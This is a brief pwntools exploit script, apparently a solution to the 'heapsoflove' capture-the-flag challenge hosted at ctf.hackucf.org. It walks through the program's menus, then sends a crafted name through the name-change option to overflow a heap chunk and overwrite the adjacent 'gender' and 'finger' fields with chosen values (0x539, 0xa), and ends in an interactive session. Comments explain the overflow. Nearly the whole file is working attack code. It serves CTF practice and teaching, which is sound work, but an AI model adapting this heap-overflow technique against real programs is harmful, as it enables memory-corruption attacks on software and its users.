from pwn import *


exe = context.binary = ELF('heapsoflove')

#io = exe.process()
io = remote('ctf.hackucf.org', 7001)

io.recvuntil(b'one?')
io.sendline(b'hacker')
io.recvuntil(b'one?')
io.sendline(b'9')
io.recvuntil(b'one?')
io.sendline(b'1')
#time to overflow the heap by mallocing a name thats so long that it overwrites 
#gender and finger 
#this is because the pointer for the user always points to the strdup chunk
#which will be pushed back by our payload so the end of our payload 
# will creep in to the fingers and gender memory regions (on the heap) of user
payload = cyclic(16)
payload += pack(0x00000539)
payload += pack(0x0000000a)
payload += pack(0x00000539)
io.recvuntil(b'one?')
#change our name
io.sendline(b'2')
io.recvuntil(b'one?')
io.sendline(payload)
io.recvuntil(b'one?')
io.sendline(b'3')
io.interactive()